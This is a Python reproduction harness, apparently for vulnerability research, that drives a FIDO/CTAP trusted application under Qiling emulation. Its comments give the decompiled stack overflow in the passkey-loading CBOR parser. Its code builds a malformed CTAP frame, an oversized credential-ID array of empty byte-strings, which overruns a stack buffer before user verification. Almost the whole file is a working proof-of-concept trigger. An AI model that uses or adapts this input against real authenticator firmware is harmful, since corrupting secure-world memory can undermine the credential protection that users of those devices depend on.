#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === FIDO-2 / S16-F9 structure-aware reproduction harness ==============
# Target: lapis fido_ctap 14b0aad8-c011-4a3f-b66aca8d0e66f273.
#   GP InvokeCommand @0x3c578: paramTypes==0x65; param0=MEMREF_INPUT(data),
#   param1=MEMREF_OUTPUT. cmd_id (w19) > 4 routes to the CTAP path
#   (process_fido_cmd -> CTAP_Process sub_43FD0).
#   CTAP_Process reads inbuf[0]=authenticator-select, inbuf[1]=CTAP cmd:
#     inbuf[0]==15 => "passkey tee authenticator"
#     inbuf[1]==0x50 => passkey_load -> ctap_parse_psk_data (sub_7DDD0).
#
# BUG (ctap_parse_psk_data sub_7DDD0, decompiled from the lapis binary):
#   CBOR map key 2 == CC_credentialIdlist -> a CBOR ARRAY. The array length
#   listSize (v36) is read with NO upper clamp (*a3 = listSize). Then:
#       v42 = a3 + 1;  v43 = 0;
#       while (current_elem == 0x40 /*empty byte-string*/) {
#           cbor_value_copy_byte_string(... scratch ...);   // "credentialid is too large" guard only checks per-elem
#           memcpy(v42, scratch, 16);                        // copy 16 bytes
#           ++v43;  v42 += 8 (ints) == +0x20 bytes;          // STRIDE 0x20
#           if (v43 >= *a3 /*listSize*/) break;
#       }
#   The destination a3 = (caller stack) v4-12768 = a 12758-byte (0x31D6) stack
#   scratch that the caller pre-zeroes. listSize x 0x20 with no bound overruns it
#   once listSize > 12758/0x20 ~= 398. Each element must be CBOR 0x40 (empty
#   byte-string) to keep the loop going. => OOB write past the 0x31D6 stack
#   scratch into the saved-register / parent-frame region, reached PRE-UV.
#
# CTAP frame this harness crafts (param0 INPUT):
#   [byte 0x0F authsel=passkey-tee][byte 0x50 cmd=passkey_load][ CBOR map ]
#   CBOR map = A1 02 <array of N x 0x40>   (map{ key 2 : [0x40 * N] })
#     0xA1 = map(1) ; 0x02 = uint key 2 ; array header for N elements ; N x 0x40.
#   N is chosen >> 398 so the 0x20-stride copy overruns the 0x31D6 scratch.
#
# param1 OUTPUT redzoned; but the OOB write is into the TA's *stack* scratch
# (not a param buffer), so detection is via the corrupted control flow /
# unmapped fault the overflow produces (the stack scratch sits below saved regs).

CMD_ID = 0             # GP cmd_id 0 == "origin command" -> sub_3C270 -> CTAP_Process
                       # (case 0 in TA_InvokeCommandEntryPoint; requires out_size > 0x7F)
PTYPES = 0x65
OUTSZ = 0x608          # > 0x7F so case 0 doesn't bail "Out buffer size is too small"

def _cbor_array_header(n):
    # CBOR array (major type 4 = 0x80). Encode length n.
    if n < 24:
        return bytes([0x80 | n])
    elif n < 0x100:
        return bytes([0x98, n])
    elif n < 0x10000:
        return bytes([0x99]) + struct.pack(">H", n)
    else:
        return bytes([0x9A]) + struct.pack(">I", n)

def _build(n_elems):
    # CTAP header: authsel=15 (passkey tee), cmd=0x50 (passkey_load)
    hdr = bytes([0x0F, 0x50])
    # CBOR map(1): key=2 (CC_credentialIdlist) -> array(n) of empty byte-strings 0x40
    cbor = bytes([0xA1, 0x02]) + _cbor_array_header(n_elems) + b"\x40" * n_elems
    return hdr + cbor

FORCE_N = os.environ.get("F9_N")

def place_input_callback(ql: Qiling, input: bytes, _: int):
    if len(input) < 2:
        return False
    if FORCE_N is not None:
        n = int(FORCE_N, 0)
    else:
        # overflow window: listSize from ~400 up to a few thousand (keep data < 0x2800 cap)
        n = 400 + (struct.unpack_from("<H", input, 0)[0] % 2200)
    data = _build(n)
    # fido caps input at 0x2800; keep within
    if len(data) > 0x2800:
        data = data[:0x2800]
    print(f"[F9] cmd=0x50 passkey_load listSize(N)={n} datalen={len(data)} "
          f"(stride 0x20 x N into 0x31D6 stack scratch; overflow if N>398)")
    command_params = [
        MemRefParam(data, max(len(data), 0x40)),  # param0 INPUT (CTAP frame)
        MemRefParam(bytes(OUTSZ), OUTSZ),          # param1 OUTPUT
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD_ID, PTYPES, command_params)
    return True
